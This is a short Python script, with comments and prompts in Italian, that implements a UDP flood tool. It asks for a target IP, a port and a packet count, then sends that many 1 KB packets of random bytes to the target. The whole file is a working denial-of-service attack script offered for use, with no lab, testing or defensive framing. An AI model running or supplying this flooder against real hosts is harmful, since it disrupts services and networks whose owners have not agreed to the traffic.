import socket
import random
import threading

def udp_flood(target_ip, target_port, num_packets):
    """
    Invia un numero specificato di pacchetti UDP di 1KB alla macchina target.
    """
    try:
        # Creazione del socket UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Costruzione del pacchetto (1KB di byte casuali)
        packet_size = 1024  # 1 KB
        packet_data = random.randbytes(packet_size)

        print(f"Invio di {num_packets} pacchetti UDP di 1KB a {target_ip}:{target_port}...")

        for i in range(num_packets):
            # Invio del pacchetto
            sock.sendto(packet_data, (target_ip, target_port))
            # Stampa un indicatore ogni 1000 pacchetti inviati per non sovraccaricare l'output
            if (i + 1) % 1000 == 0:
                print(f"Pacchetti inviati: {i + 1}")

        print("Invio completato.")

    except socket.error as e:
        print(f"Errore durante l'invio: {e}")
    finally:
        if 'sock' in locals():
            sock.close()

if __name__ == "__main__":
    # Richiesta dell'IP target all'utente
    target_ip = input("Inserisci l'IP della macchina target: ")

    # Richiesta della porta target all'utente
    while True:
        try:
            target_port = int(input("Inserisci la porta UDP target: "))
            if 1 <= target_port <= 65535:
                break
            else:
                print("La porta deve essere un numero intero tra 1 e 65535.")
        except ValueError:
            print("Inserisci un numero intero valido per la porta.")

    # Richiesta del numero di pacchetti da inviare
    while True:
        try:
            num_packets = int(input("Inserisci il numero di pacchetti da inviare: "))
            if num_packets > 0:
                break
            else:
                print("Il numero di pacchetti deve essere maggiore di zero.")
        except ValueError:
            print("Inserisci un numero intero valido per il numero di pacchetti.")

    # Esecuzione della funzione di flood
    udp_flood(target_ip, target_port, num_packets)